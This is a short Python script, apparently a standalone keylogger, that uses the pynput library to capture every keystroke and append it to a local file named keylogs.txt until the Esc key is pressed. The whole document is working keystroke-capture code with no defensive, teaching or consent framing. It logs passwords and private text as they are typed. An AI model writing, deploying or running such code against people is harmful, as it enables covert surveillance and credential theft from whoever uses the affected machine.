import pynput.keyboard as keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a', encoding='utf-8') as file:
            if key == keyboard.Key.space:
                file.write('[SPACE] ')
            elif key == keyboard.Key.enter:
                file.write('\n')
            else:
                char = str(key).replace("'", "")
                file.write(char)
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()